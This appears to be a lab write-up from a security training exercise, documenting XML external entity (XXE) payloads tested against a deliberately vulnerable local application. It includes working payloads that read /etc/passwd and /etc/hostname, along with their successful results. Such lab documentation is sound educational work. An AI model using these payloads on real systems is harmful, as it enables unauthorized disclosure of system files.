# XXE Payloads

## 1. Introduction

This file documents the XML payloads used to test the XXE vulnerability in the training application.

All tests were performed in the local Docker environment.

## 2. Normal XML Test

**Purpose:**

To verify that the application accepts and processes normal XML input.

**Payload:**

```xml
<?xml version="1.0"?>
<student>
    <name>Kenda</name>
    <major>Cyber Security</major>
</student>
```

**Result:**

The application successfully parsed the XML document and displayed the student information.

## 3. Payload 1: Local File Disclosure

**Target:** `/etc/passwd`

**Purpose:**

To test whether the XML parser can access local files through external entity resolution.

**Payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE student [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<student>
    <name>&xxe;</name>
    <major>Cyber Security</major>
</student>
```

**Result:**

The application successfully displayed the contents of `/etc/passwd`.

System account entries such as `root`, `daemon`, and `www-data` appeared in the response.

**Status:** Successful.

## 4. Payload 2: Local Hostname Disclosure

**Target:** `/etc/hostname`

**Purpose:**

To verify that the vulnerability can access another local file.

**Payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE student [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<student>
    <name>&xxe;</name>
    <major>Cyber Security</major>
</student>
```

**Result:**

The application successfully displayed the container hostname:

`8d6b0466cf87`

**Status:** Successful.

## 5. Test Summary

| Test | Target | Result |
|---|---|---|
| Normal XML | Student XML | Successful parsing |
| Payload 1 | /etc/passwd | File contents disclosed |
| Payload 2 | /etc/hostname | Hostname disclosed |

## 6. Conclusion

The tests confirmed that the XML parser resolves external entities from untrusted XML input.

The successful disclosure of two local files demonstrates the impact of the XXE vulnerability in the training application.

All tests were performed in an authorized local environment.
